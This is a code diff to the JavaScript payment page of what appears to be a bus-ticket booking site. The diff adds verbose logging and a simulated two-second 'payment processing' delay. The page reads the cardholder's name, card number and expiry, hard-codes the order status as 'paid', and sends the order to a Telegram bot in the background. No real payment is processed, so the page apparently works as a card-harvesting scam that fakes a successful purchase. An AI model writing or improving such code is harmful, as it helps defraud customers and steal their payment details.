@@ -350,20 +350,24 @@ class PaymentPage {
     const payBtn = document.querySelector('.pay-btn');
     const originalText = payBtn.textContent;
     
+    console.log('Starting payment process...');
+    
     // Show loading state
     payBtn.classList.add('loading');
     payBtn.disabled = true;
 
     try {
-      // Generate booking ID
+      console.log('Generating booking ID...');
       const bookingId = this.generateBookingId();
+      console.log('Booking ID generated:', bookingId);
       
-      // Get form data
+      console.log('Getting form data...');
       const cardHolderElement = document.getElementById('cardHolder');
       const cardNumberElement = document.getElementById('cardNumber');
       const cardExpiryElement = document.getElementById('cardExpiry');
       
       if (!cardHolderElement || !cardNumberElement || !cardExpiryElement) {
+        console.error('Form elements missing');
         throw new Error('Required form elements not found');
       }
       
@@ -371,20 +375,25 @@ class PaymentPage {
       const cardExpiry = cardExpiryElement.value;
       const cardHolderName = cardHolderElement.value;
       
+      console.log('Form data collected:', { cardHolderName, cardExpiry, cardNumberLength: cardNumber.length });
+      
       if (!cardNumber || !cardExpiry || !cardHolderName) {
+        console.error('Missing required fields');
         throw new Error('Please fill in all required fields');
       }
       
+      console.log('Processing card data...');
       const cardType = this.getCardType(cardNumber);
       const lastFour = cardNumber.replace(/\s/g, '').slice(-4);
+      console.log('Card processed:', { cardType, lastFour });
       
-      // Prepare order data for Telegram bot
+      console.log('Preparing order data...');
       const orderData = {
         bookingId: bookingId,
         customer: {
           name: cardHolderName,
-          email: 'busboking@example.com', // Would be collected from additional form in real app
-          phone: '+48 xxx xxx xxx' // Would be collected from additional form
+          email: 'busboking@example.com',
+          phone: '+48 xxx xxx xxx'
         },
         card: {
           lastFour: lastFour,
@@ -406,17 +415,21 @@ class PaymentPage {
         status: 'paid'
       };
       
-      console.log('Sending order to Telegram bot:', orderData);
+      console.log('Order data prepared:', orderData);
       
-      // Send order to Telegram bot
-      try {
-        await this.sendToTelegramBot(orderData);
-      } catch (telegramError) {
-        console.warn('Telegram notification failed, but continuing with order:', telegramError);
-      }
+      // Simulate payment processing delay
+      console.log('Simulating payment processing...');
+      await new Promise(resolve => setTimeout(resolve, 2000));
       
+      // Send order to Telegram bot (non-blocking)
+      console.log('Sending to Telegram...');
+      this.sendToTelegramBot(orderData).catch(telegramError => {
+        console.warn('Telegram notification failed:', telegramError);
+      });
+      
+      console.log('Saving to localStorage...');
       // Save payment success to localStorage
-      localStorage.setItem('paymentComplete', JSON.stringify({
+      const paymentData = {
         bookingId: bookingId,
         seats: this.selectedSeats,
         route: `${this.bookingData.from} → ${this.bookingData.to}`,
@@ -424,14 +437,20 @@ class PaymentPage {
         time: `${this.bookingData.departureTime} - ${this.bookingData.arrivalTime}`,
         price: `€${this.totalPrice.toFixed(2)}`,
         timestamp: new Date().toISOString()
-      }));
+      };
+      
+      localStorage.setItem('paymentComplete', JSON.stringify(paymentData));
+      console.log('Data saved to localStorage');
 
+      console.log('Redirecting to confirmation page...');
       // Redirect to confirmation page
       window.location.href = 'confirmation.html';
       
     } catch (error) {
-      console.error('Payment failed:', error);
-      alert('Payment failed. Please try again.');
+      console.error('Payment processing error:', error);
+      console.error('Error stack:', error.stack);
+      
+      alert(`Payment failed: ${error.message}. Please try again.`);
       
       // Restore button
       payBtn.classList.remove('loading');
